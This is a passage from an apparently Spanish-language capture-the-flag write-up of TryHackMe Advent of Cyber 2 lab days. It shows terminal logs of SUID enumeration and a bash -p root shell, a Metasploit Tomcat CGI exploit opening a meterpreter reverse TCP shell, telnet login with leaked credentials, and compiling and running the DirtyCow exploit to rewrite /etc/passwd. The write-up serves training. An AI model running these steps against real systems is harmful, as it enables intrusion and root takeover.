</span><span class="s1">Enter WORKGROUP\kali&#39;</span>s password: 
tree connect failed: NT_STATUS_ACCESS_DENIED
kali@kali:~/thm/adventcyber2$ smbclient <span class="se">\\\\</span>10.10.77.26<span class="se">\\</span>tbfc-santa
Enter WORKGROUP<span class="se">\k</span>ali<span class="err">&#39;</span>s password: 
Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> ls 
  .                                   D        <span class="m">0</span>  Wed Nov <span class="m">11</span> 21:12:07 <span class="m">2020</span>
  ..                                  D        <span class="m">0</span>  Wed Nov <span class="m">11</span> 20:32:21 <span class="m">2020</span>
  jingle-tunes                        D        <span class="m">0</span>  Wed Nov <span class="m">11</span> 21:10:41 <span class="m">2020</span>
  note_from_mcskidy.txt               N      <span class="m">143</span>  Wed Nov <span class="m">11</span> 21:12:07 <span class="m">2020</span>

    <span class="m">10252564</span> blocks of size 1024. <span class="m">5368116</span> blocks available
smb: <span class="se">\&gt;</span> get note_from_mcskidy.txt
getting file <span class="se">\n</span>ote_from_mcskidy.txt of size <span class="m">143</span> as note_from_mcskidy.txt <span class="o">(</span>0.1 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.1 KiloBytes/sec<span class="o">)</span>
smb: <span class="se">\&gt;</span> <span class="nb">cd</span> jingle-tunes
smb: <span class="se">\j</span>ingle-tunes<span class="se">\&gt;</span> ls
  .                                   D        <span class="m">0</span>  Wed Nov <span class="m">11</span> 21:10:41 <span class="m">2020</span>
  ..                                  D        <span class="m">0</span>  Wed Nov <span class="m">11</span> 21:12:07 <span class="m">2020</span>

    <span class="m">10252564</span> blocks of size 1024. <span class="m">5368116</span> blocks available
smb: <span class="se">\j</span>ingle-tunes<span class="se">\&gt;</span> <span class="nb">exit</span>
kali@kali:~/thm/adventcyber2$ cat note_from_mcskidy.txt 
Hi Santa, I decided to put all of your favourite jingles onto this share - allowing you access it from anywhere you like! Regards ~ ElfMcSkidy
kali@kali:~/thm/adventcyber2$
</code></pre></td></tr></table>
</div>
</div>
</div>


</div>

<script>
  'use strict';

  var containerId = JSON.parse("\"521f83c69789640e\"");
  var containerElem = document.getElementById(containerId);
  var codetabLinks = null;
  var codetabContents = null;
  var ids = [];

  if (containerElem) {
    codetabLinks = containerElem.querySelectorAll('.codetab__link');
    codetabContents = containerElem.querySelectorAll('.codetab__content');
  }

  for (var i = 0; i < codetabContents.length; i++) {
    ids = ids.concat(codetabContents[i].getAttribute('id'));
    codetabContents[i].style.display = 'none';

    if (0 === parseInt(i, 10) && !codetabContents[i].classList.contains('active')) {
      codetabContents[i].classList.add('active');
    }
  }

  for (var i = 0; i < codetabLinks.length; i++) {
    codetabLinks[i].setAttribute('id', ids[i]);

    if (0 === parseInt(i, 10) && !codetabLinks[i].classList.contains('active')) {
      codetabLinks[i].classList.add('active');
    } else {
      codetabLinks[i].classList.remove('active');
    }
  }

  if (codetabContents.length > 0) {
    codetabContents[0].style.display = 'block';
  }
</script>
<h1 id="day-11---networking-">DAY 11 - Networking</h1>
<p>Se presenta una maquina en la cual tenemos acceso y es necesario escalar privilegios utilizando los &ldquo;comandos/guias&rdquo; de <a href="https://gtfobins.github.io/"><strong>GTFObins</strong></a>. Con la informacion descrita en el reto del dia es suficiente para resolver las tareas y obtener la flag. Enumeracion de archivos con permisos <em>SUID</em>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">-bash-4.4$ find / -perm -4000 2&gt; /dev/null <span class="p">|</span> xargs ls -lah
-rwsr-xr-x <span class="m">1</span> root   root            1.1M Jun  <span class="m">6</span>  <span class="m">2019</span> /bin/bash
-rwsr-xr-x <span class="m">1</span> root   root             31K Aug <span class="m">11</span>  <span class="m">2016</span> /bin/fusermount
-rwsr-xr-x <span class="m">1</span> root   root             43K Sep <span class="m">16</span> 18:43 /bin/mount
-rwsr-xr-x <span class="m">1</span> root   root             63K Jun <span class="m">28</span>  <span class="m">2019</span> /bin/ping
-rwsr-xr-x <span class="m">1</span> root   root             44K Mar <span class="m">22</span>  <span class="m">2019</span> /bin/su
-rwsr-xr-x <span class="m">1</span> root   root             27K Sep <span class="m">16</span> 18:43 /bin/umount
... snap stuff - snip ...
-rwsr-sr-x <span class="m">1</span> daemon daemon           51K Feb <span class="m">20</span>  <span class="m">2018</span> /usr/bin/at
-rwsr-xr-x <span class="m">1</span> root   root             75K Mar <span class="m">22</span>  <span class="m">2019</span> /usr/bin/chfn
-rwsr-xr-x <span class="m">1</span> root   root             44K Mar <span class="m">22</span>  <span class="m">2019</span> /usr/bin/chsh
-rwsr-xr-x <span class="m">1</span> root   root             75K Mar <span class="m">22</span>  <span class="m">2019</span> /usr/bin/gpasswd
-rwsr-xr-x <span class="m">1</span> root   root             37K Mar <span class="m">22</span>  <span class="m">2019</span> /usr/bin/newgidmap
-rwsr-xr-x <span class="m">1</span> root   root             40K Mar <span class="m">22</span>  <span class="m">2019</span> /usr/bin/newgrp
-rwsr-xr-x <span class="m">1</span> root   root             37K Mar <span class="m">22</span>  <span class="m">2019</span> /usr/bin/newuidmap
-rwsr-xr-x <span class="m">1</span> root   root             59K Mar <span class="m">22</span>  <span class="m">2019</span> /usr/bin/passwd
-rwsr-xr-x <span class="m">1</span> root   root             22K Mar <span class="m">27</span>  <span class="m">2019</span> /usr/bin/pkexec
-rwsr-xr-x <span class="m">1</span> root   root            146K Jan <span class="m">31</span>  <span class="m">2020</span> /usr/bin/sudo
-rwsr-xr-x <span class="m">1</span> root   root             19K Jun <span class="m">28</span>  <span class="m">2019</span> /usr/bin/traceroute6.iputils
-rwsr-xr-- <span class="m">1</span> root   messagebus       42K Jun <span class="m">11</span>  <span class="m">2020</span> /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x <span class="m">1</span> root   root             10K Mar <span class="m">28</span>  <span class="m">2017</span> /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x <span class="m">1</span> root   root            427K Mar  <span class="m">4</span>  <span class="m">2019</span> /usr/lib/openssh/ssh-keysign
-rwsr-xr-x <span class="m">1</span> root   root             14K Mar <span class="m">27</span>  <span class="m">2019</span> /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x <span class="m">1</span> root   root            111K Jul <span class="m">10</span> 14:00 /usr/lib/snapd/snap-confine
-rwsr-xr-x <span class="m">1</span> root   root             99K Nov <span class="m">23</span>  <span class="m">2018</span> /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-bash-4.4$
</code></pre></td></tr></table>
</div>
</div><p>Utilizamos bash para obtener una shell root y la flag.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">-bash-4.4$ /bin/bash -p
bash-4.4# <span class="nb">cd</span>
bash-4.4# whoami<span class="p">;</span> <span class="nb">pwd</span>
root
/home/cmnatic
bash-4.4# <span class="nb">cd</span> /root
bash-4.4# ls
flag.txt
bash-4.4# cat flag.txt
thm<span class="o">{</span>2fb1<span class="o">[</span>... snip ...<span class="o">]</span>592<span class="o">}</span>
bash-4.4#
</code></pre></td></tr></table>
</div>
</div><h1 id="day-12---networking-">DAY 12 - Networking</h1>
<p>Se presenta una maquina vulnerable a <em>ShellShock attack</em> utilizando metasploit y la informacion descrita en el reto del dia es posible resolver las tareas y obtener la flag.</p>
<p>Configuracion de metasploit con el exploit <code>windows/http/tomcat_cgi_cmdlineargs</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">msf5 exploit<span class="o">(</span>windows/http/tomcat_cgi_cmdlineargs<span class="o">)</span> &gt; show options 

Module options <span class="o">(</span>exploit/windows/http/tomcat_cgi_cmdlineargs<span class="o">)</span>:

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port<span class="o">[</span>,type:host:port<span class="o">][</span>...<span class="o">]</span>
   RHOSTS     10.10.92.152     yes       The target host<span class="o">(</span>s<span class="o">)</span>, range CIDR identifier, or hosts file with syntax <span class="s1">&#39;file:&lt;path&gt;&#39;</span>
   RPORT      <span class="m">8080</span>             yes       The target port <span class="o">(</span>TCP<span class="o">)</span>
   SSL        <span class="nb">false</span>            no        Negotiate SSL/TLS <span class="k">for</span> outgoing connections
   SSLCert                     no        Path to a custom SSL certificate <span class="o">(</span>default is randomly generated<span class="o">)</span>
   TARGETURI  /                yes       The URI path to CGI script
   VHOST                       no        HTTP server virtual host


Payload options <span class="o">(</span>windows/meterpreter/reverse_tcp<span class="o">)</span>:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique <span class="o">(</span>Accepted: <span class="s1">&#39;&#39;</span>, seh, thread, process, none<span class="o">)</span>
   LHOST     10.2.29.162      yes       The listen address <span class="o">(</span>an interface may be specified<span class="o">)</span>
   LPORT     <span class="m">1338</span>             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   <span class="m">0</span>   Apache Tomcat 9.0 or prior <span class="k">for</span> Windows


msf5 exploit<span class="o">(</span>windows/http/tomcat_cgi_cmdlineargs<span class="o">)</span> &gt; <span class="nb">set</span> TARGETURI /cgi-bin/elfwhacker.bat
<span class="nv">TARGETURI</span> <span class="o">=</span>&gt; /cgi-bin/elfwhacker.bat
msf5 exploit<span class="o">(</span>windows/http/tomcat_cgi_cmdlineargs<span class="o">)</span> &gt; run

<span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 10.2.29.162:1338 
<span class="o">[</span>*<span class="o">]</span> Checking <span class="k">if</span> 10.10.92.152 is vulnerable
<span class="o">[</span>*<span class="o">]</span> 10.10.92.152 seems vulnerable, what a good day.
<span class="o">[</span>*<span class="o">]</span> Command Stager progress -   6.95% <span class="k">done</span> <span class="o">(</span>6999/100668 bytes<span class="o">)</span>
<span class="o">[</span>*<span class="o">]</span> Command Stager progress -  13.91% <span class="k">done</span> <span class="o">(</span>13998/100668 bytes<span class="o">)</span>
<span class="o">[</span>*<span class="o">]</span> Command Stager progress -  20.86% <span class="k">done</span> <span class="o">(</span>20997/100668 bytes<span class="o">)</span>
<span class="o">[</span>*<span class="o">]</span> Command Stager progress -  27.81% <span class="k">done</span> <span class="o">(</span>27996/100668 bytes<span class="o">)</span>
<span class="o">[</span>*<span class="o">]</span> Command Stager progress -  34.76% <span class="k">done</span> <span class="o">(</span>34995/100668 bytes<span class="o">)</span>
<span class="o">[</span>*<span class="o">]</span> Command Stager progress -  41.72% <span class="k">done</span> <span class="o">(</span>41994/100668 bytes<span class="o">)</span>
<span class="o">[</span>*<span class="o">]</span> Command Stager progress -  48.67% <span class="k">done</span> <span class="o">(</span>48993/100668 bytes<span class="o">)</span>
<span class="o">[</span>*<span class="o">]</span> Command Stager progress -  55.62% <span class="k">done</span> <span class="o">(</span>55992/100668 bytes<span class="o">)</span>
<span class="o">[</span>*<span class="o">]</span> Command Stager progress -  62.57% <span class="k">done</span> <span class="o">(</span>62991/100668 bytes<span class="o">)</span>
<span class="o">[</span>*<span class="o">]</span> Command Stager progress -  69.53% <span class="k">done</span> <span class="o">(</span>69990/100668 bytes<span class="o">)</span>
<span class="o">[</span>*<span class="o">]</span> Command Stager progress -  76.48% <span class="k">done</span> <span class="o">(</span>76989/100668 bytes<span class="o">)</span>
<span class="o">[</span>*<span class="o">]</span> Command Stager progress -  83.43% <span class="k">done</span> <span class="o">(</span>83988/100668 bytes<span class="o">)</span>
<span class="o">[</span>*<span class="o">]</span> Command Stager progress -  90.38% <span class="k">done</span> <span class="o">(</span>90987/100668 bytes<span class="o">)</span>
<span class="o">[</span>*<span class="o">]</span> Command Stager progress -  97.34% <span class="k">done</span> <span class="o">(</span>97986/100668 bytes<span class="o">)</span>
<span class="o">[</span>*<span class="o">]</span> Command Stager progress - 100.02% <span class="k">done</span> <span class="o">(</span>100692/100668 bytes<span class="o">)</span>
<span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">176195</span> bytes<span class="o">)</span> to 10.10.92.152
<span class="o">[</span>*<span class="o">]</span> Meterpreter session <span class="m">1</span> opened <span class="o">(</span>10.2.29.162:1338 -&gt; 10.10.92.152:49815<span class="o">)</span> at 2020-12-14 12:36:58 -0500
meterpreter &gt; search -f flag1.txt

Found <span class="m">1</span> result...
    c:<span class="se">\P</span>rogram Files<span class="se">\A</span>pache Software Foundation<span class="se">\T</span>omcat 9.0<span class="se">\w</span>ebapps<span class="se">\R</span>OOT<span class="se">\W</span>EB-INF<span class="se">\c</span>gi-bin<span class="se">\f</span>lag1.txt <span class="o">(</span><span class="m">27</span> bytes<span class="o">)</span>
meterpreter &gt; 
meterpreter &gt; shell
Process <span class="m">2744</span> created.
Channel <span class="m">2</span> created.
Microsoft Windows <span class="o">[</span>Version 10.0.17763.1637<span class="o">]</span>
<span class="o">(</span>c<span class="o">)</span> <span class="m">2018</span> Microsoft Corporation. All rights reserved.

C:<span class="se">\P</span>rogram Files<span class="se">\A</span>pache Software Foundation<span class="se">\T</span>omcat 9.0<span class="se">\w</span>ebapps<span class="se">\R</span>OOT<span class="se">\W</span>EB-INF<span class="se">\c</span>gi-bin&gt;dir         
dir
 Volume in drive C has no label.
 Volume Serial Number is 4277-4242

 Directory of C:<span class="se">\P</span>rogram Files<span class="se">\A</span>pache Software Foundation<span class="se">\T</span>omcat 9.0<span class="se">\w</span>ebapps<span class="se">\R</span>OOT<span class="se">\W</span>EB-INF<span class="se">\c</span>gi-bin

14/12/2020  23:37    &lt;DIR&gt;          .
14/12/2020  23:37    &lt;DIR&gt;          ..
14/12/2020  23:37            73,802 DXKwV.exe
19/11/2020  21:39               <span class="m">825</span> elfwhacker.bat
19/11/2020  22:06                <span class="m">27</span> flag1.txt
               <span class="m">3</span> File<span class="o">(</span>s<span class="o">)</span>         74,654 bytes
               <span class="m">2</span> Dir<span class="o">(</span>s<span class="o">)</span>   6,550,839,296 bytes free

C:<span class="se">\P</span>rogram Files<span class="se">\A</span>pache Software Foundation<span class="se">\T</span>omcat 9.0<span class="se">\w</span>ebapps<span class="se">\R</span>OOT<span class="se">\W</span>EB-INF<span class="se">\c</span>gi-bin&gt;type flag1.txt
<span class="nb">type</span> flag1.txt
thm<span class="o">{</span>whacking<span class="o">[</span>... snip ...<span class="o">]</span>elves<span class="o">}</span>
C:<span class="se">\P</span>rogram Files<span class="se">\A</span>pache Software Foundation<span class="se">\T</span>omcat 9.0<span class="se">\w</span>ebapps<span class="se">\R</span>OOT<span class="se">\W</span>EB-INF<span class="se">\c</span>gi-bin&gt;
</code></pre></td></tr></table>
</div>
</div><p>Utilizando <code>local_exploit_suggester</code> para listar los exploits para la maquina que puedan ser utiles para escalar privilegios.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">meterpreter &gt; run post/multi/recon/local_exploit_suggester 

<span class="o">[</span>*<span class="o">]</span> 10.10.92.152 - Collecting <span class="nb">local</span> exploits <span class="k">for</span> x86/windows...
<span class="o">[</span>*<span class="o">]</span> 10.10.92.152 - <span class="m">30</span> exploit checks are being tried...
<span class="o">[</span>+<span class="o">]</span> 10.10.92.152 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
<span class="o">[</span>+<span class="o">]</span> 10.10.92.152 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
meterpreter &gt;
</code></pre></td></tr></table>
</div>
</div><p>Aunque el usuario actual al parecer ya pertenece al grupo de Administradores.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">C:<span class="se">\P</span>rogram Files<span class="se">\A</span>pache Software Foundation<span class="se">\T</span>omcat 9.0<span class="se">\w</span>ebapps<span class="se">\R</span>OOT<span class="se">\W</span>EB-INF<span class="se">\c</span>gi-bin&gt;whoami
whoami
tbfc-web-01<span class="se">\e</span>lfmcskidy

C:<span class="se">\P</span>rogram Files<span class="se">\A</span>pache Software Foundation<span class="se">\T</span>omcat 9.0<span class="se">\w</span>ebapps<span class="se">\R</span>OOT<span class="se">\W</span>EB-INF<span class="se">\c</span>gi-bin&gt;net user elfmcskidy
net user elfmcskidy
User name                    elfmcskidy
Full Name                    elfmcskidy
Comment                      
User<span class="err">&#39;</span>s comment               
Country/region code          <span class="m">000</span> <span class="o">(</span>System Default<span class="o">)</span>
Account active               Yes
Account expires              Never

Password last <span class="nb">set</span>            19/11/2020 13:16:41
Password expires             Never
Password changeable          19/11/2020 13:16:41
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   14/12/2020 23:21:08

Logon hours allowed          All

Local Group Memberships      *Administrators       *Users                
Global Group memberships     *None                 
</code></pre></td></tr></table>
</div>
</div><h1 id="day-13---coal-for-christmas-">DAY 13 - Coal for Christmas</h1>
<p>Con la maquina dada se realiza las siguientes tareas con la ayuda de la descripcion de cada una:</p>
<ul>
<li>Port Scanning</li>
<li>Initial Access</li>
<li>Enumeration</li>
<li>Privilege Escalation</li>
</ul>
<h2 id="port-scanning---nmap-">PORT SCANNING - NMAP</h2>
<p>Se realiza un escaneo de puertos donde encontramos los puertos ssh (22), telnet (23) y rpcbind (111).</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-12-14 13:23 EST
Nmap scan report <span class="k">for</span> 10.10.155.23 <span class="o">(</span>10.10.155.23<span class="o">)</span>
Host is up <span class="o">(</span>0.25s latency<span class="o">)</span>.
Not shown: <span class="m">997</span> closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
23/tcp  open  telnet
111/tcp open  rpcbind

Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 52.89 seconds
</code></pre></td></tr></table>
</div>
</div><h2 id="initial-access---telnet-">INITIAL ACCESS - TELNET</h2>
<p>A traves del puerto 23 de telnet realizamos la conexion donde se presentan unas credenciales con las cuales se logró obtener una shell.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~/thm/adventcyber2$ telnet 10.10.155.23 <span class="m">23</span>
Trying 10.10.155.23...
Connected to 10.10.155.23.
Escape character is <span class="s1">&#39;^]&#39;</span>.
HI SANTA!!! 

We knew you were coming and we wanted to make
it easy to drop off presents, so we created
an account <span class="k">for</span> you to use.

Username: santa
Password: clauschristmas

We left you cookies and milk!

christmas login: santa
Password: 
Last login: Sat Nov <span class="m">21</span> 20:37:37 UTC <span class="m">2020</span> from 10.0.2.2 on pts/2
                <span class="se">\ </span>/ 
              --&gt;*&lt;-- 
                /o<span class="se">\ </span>
               /_<span class="se">\_\ </span>
              /_/_0_<span class="se">\ </span>
             /_o_<span class="se">\_\_\ </span>
            /_/_/_/_/o<span class="se">\ </span>
           /@<span class="se">\_\_\@\_\_\ </span>
          /_/_/O/_/_/_/_<span class="se">\ </span>
         /_<span class="se">\_\_\_\_\o\_\_\ </span>
        /_/0/_/_/_0_/_/@/_<span class="se">\ </span>
       /_<span class="se">\_\_\_\_\_\_\_\_\_\ </span>
      /_/o/_/_/@/_/_/o/_/0/_<span class="se">\ </span>
               <span class="o">[</span>___<span class="o">]</span> 
   
$ whoami<span class="p">;</span> <span class="nb">pwd</span>
santa
/home/santa
$ 
</code></pre></td></tr></table>
</div>
</div><h2 id="enumeration-">ENUMERATION</h2>
<p>Version del sistema operativo <code>Ubuntu 12.04</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">$ uname -a
Linux christmas 3.2.0-23-generic <span class="c1">#36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux</span>
$ cat /etc/*release
<span class="nv">DISTRIB_ID</span><span class="o">=</span>Ubuntu
<span class="nv">DISTRIB_RELEASE</span><span class="o">=</span>12.04
<span class="nv">DISTRIB_CODENAME</span><span class="o">=</span>precise
<span class="nv">DISTRIB_DESCRIPTION</span><span class="o">=</span><span class="s2">&#34;Ubuntu 12.04 LTS&#34;</span>
$ 
</code></pre></td></tr></table>
</div>
</div><p>En la maquina existe un archivo el cual está escrito en C, que al realizar una busqueda de una porcion de codigo encontramos que es parte del exploit de dirtycow. Aunque en la descripcion del reto se explica esta parte.<br />
<img src="/images/posts/thm/aoc2/Screenshot_20201214_124125.png" alt="image" /></p>
<h2 id="privilege-escalation-">PRIVILEGE ESCALATION</h2>
<p>Utilizando el <a href="https://github.com/FireFart/dirtycow/blob/master/dirty.c">codigo fuente</a> del exploit encontrado en la maquina para obtener una shell con usuario root, copiando el codigo fuente a la maquina, compilar y ejecutar.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">$ gcc -pthread dirty.c -o dirty -lcrypt
$ ls -lah
total 44K
drwxr-xr-x <span class="m">3</span> santa santa 4.0K Dec <span class="m">15</span> 00:46 .
drwxr-xr-x <span class="m">3</span> root  root  4.0K Nov <span class="m">21</span> 20:37 ..
drwx------ <span class="m">2</span> santa santa 4.0K Nov <span class="m">21</span> 20:37 .cache
-rwxr-xr-x <span class="m">1</span> santa santa 1.4K Nov <span class="m">21</span> 20:37 christmas.sh
-rw-r--r-- <span class="m">1</span> santa santa 2.9K Nov <span class="m">21</span> 20:37 cookies_and_milk.txt
-rwxrwxr-x <span class="m">1</span> santa santa  14K Dec <span class="m">15</span> 00:46 dirty
-rw-rw-r-- <span class="m">1</span> santa santa 4.8K Dec <span class="m">14</span> 18:45 dirty.c
$ chmod +x dirty
$ ./dirty
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: 
Complete line:
firefart:fi6bS9A.C7BDQ:0:0:pwned:/root:/bin/bash

mmap: 7f4c58c6b000

madvise <span class="m">0</span>

